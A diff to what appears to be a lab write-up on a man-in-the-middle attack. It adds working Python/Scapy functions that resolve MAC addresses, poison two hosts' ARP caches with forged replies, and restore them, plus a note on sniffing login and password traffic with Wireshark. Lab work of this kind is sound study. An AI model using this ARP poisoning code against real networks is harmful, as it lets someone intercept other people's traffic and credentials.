@@ -60,6 +60,35 @@ We are then prompted to enter login and password
 
 #### ARP Spoofing
 
+Some useful fonctions in the program :
+
+```python
+def get_mac(IP, interface="eth0"):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
+``` 
+
+```python
+def poison_arp(target1_mac, target2_mac):
+    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac))
+    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac))
+``` 
+
+```python
+def undo_arp():
+    print("\n[*] Restoring Targets...")
+    target1_mac = get_mac(target1_ip)
+    target2_mac = get_mac(target2_ip)
+    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
+    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
+    print("[*] Disabling IP Forwarding...")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print("[*] Shutting Down...")
+    sys.exit(1)
+```
+
 We can see that both client and server have their arp cache changed when our python script is running.
 
 One the client we pretend that 192.168.0.43 has the MAC address 08:00:27:d1:98:f9.
@@ -73,7 +102,7 @@ One the server we pretend that 192.168.0.42 has the MAC address 08:00:27:d1:98:f
 #### Sniffing Packet
 
 
-Note that this action can be done using Wireshark, but information retrieving might be more general, thus it could take more time to find login and password.
+Note that this action can be done using Wireshark, but information retrieving might be more general, thus it could take more time to find login and password since this software display a lot of information.
 
 ![packet sniffing using Wireshark](assets/wireshark.png)
 
@@ -93,6 +122,7 @@ Note that this action can be done using Wireshark, but information retrieving mi
 
 1. [How To Do Man In The Middle Attack(MITM) with ARP Spoofing Using Python and Scapy](https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b)
 2. [How to Prevent ARP Spoofing Attacks?](https://www.indusface.com/blog/protect-arp-poisoning/#Identify_the_Spoofing_Attack)
+2. [Scapy Documentation](https://scapy.readthedocs.io/en/latest/)
 
 ### Appendix
 
